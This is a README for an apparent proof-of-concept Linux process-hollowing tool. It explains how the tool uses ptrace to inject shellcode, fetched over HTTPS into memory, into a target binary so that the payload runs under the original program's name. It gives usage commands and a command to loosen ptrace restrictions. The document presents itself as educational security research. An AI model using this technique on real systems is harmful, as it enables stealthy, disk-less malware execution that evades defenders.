# Simple-Linux-Process-Hollowing
A proof-of-concept x86-64 Linux process-hollowing tool implemented in pure Python (stdlib only). It starts a target binary under `ptrace`, replaces its execution with raw shellcode fetched over HTTPS or read from a local file, and lets the target continue running as if it had started normally.

Educational security research only. Run it exclusively against your own processes in an isolated lab.

## Requirements

- x86-64 Linux
- Python 3 (no third-party packages; only `ctypes`, `ssl`, `urllib`, etc.)
- Permission to ptrace: on many distros `/proc/sys/kernel/yama/ptrace_scope` must be `0` (`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`)

## Usage

```
python3 hollowing_ptrace.py <binary> [shellcode_file] [--url URL --user U --password P [--insecure]] [--wait]
```

| Argument | Description |
|---|---|
| `binary` | Target program to hollow |
| `shellcode_file` | Raw shellcode file (default: `http_shellcode` next to the script) |
| `--url URL` | Download the shellcode over HTTPS into memory instead of reading a local file |
| `--user` / `--password` | HTTP Basic credentials for `--url` (must be given together) |
| `--insecure` | Skip TLS certificate verification (lab use, self-signed certs) |
| `--wait` | Wait for the hollowed child to exit and print its exit code |

`--url` and `shellcode_file` are mutually exclusive.

### Examples

Hollow a target with a local payload and reap it:

```
python3 hollowing_ptrace.py /bin/sleep payload.bin --wait
```

Download the payload over HTTPS with Basic auth, never touching disk:

```
python3 hollowing_ptrace.py /bin/sleep --url https://127.0.0.1:8888/shellcode --user agent --password hunter2 --insecure --wait
```

## How it works

1. `fork()`; the child calls `PTRACE_TRACEME` and `execve`s the target.
2. The parent catches the SIGTRAP at the executable entry point with `waitpid`.
3. A tiny position-independent stub is poked onto the entry point with `PTRACE_POKETEXT`. The stub calls `mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` and then `int3`.
4. The parent resumes the child (`PTRACE_CONT`), traps at the `int3`, and reads the freshly mapped RWX address from RAX.
5. The shellcode is written word-by-word into that mapping.
6. The pristine execve-entry register state is restored with only RIP changed to the mapping, so the payload starts with the same machine state a real exec would give it. One dummy qword is pushed first so `rsp % 16 == 8`: payloads that begin with `push rbp; mov rbp, rsp` and use 16-byte-aligned SSE stores expect `call`-style stack alignment.
7. `PTRACE_DETACH` — the hollowed process runs the payload with the original program's name, PID lineage and memory map.

This mmap-stub approach is what allows payloads much larger than the target's entry mapping, and works for dynamically linked targets whose entry point lies in the dynamic loader.

## Payload download

- The HTTPS download happens entirely in memory; the payload is never written to disk.
- The Basic credential is sent preemptively on the first request (no 401 round-trip).
- `--insecure` disables TLS verification for self-signed lab certificates.

## Limitations

- x86-64 targets and x86-64 shellcode only.
- The payload must be compatible with the register/stack state a fresh exec provides (see the stack-alignment note above).
- POKETEXT writes 8-byte words; the payload is zero-padded to a multiple of 8, so the mapping it lives in is rounded up accordingly.

## Safety

The hollowed process executes whatever bytes you give it — reverse shells, beacons, anything. Test only inside a controlled lab against throwaway binaries, and never against systems you do not own.

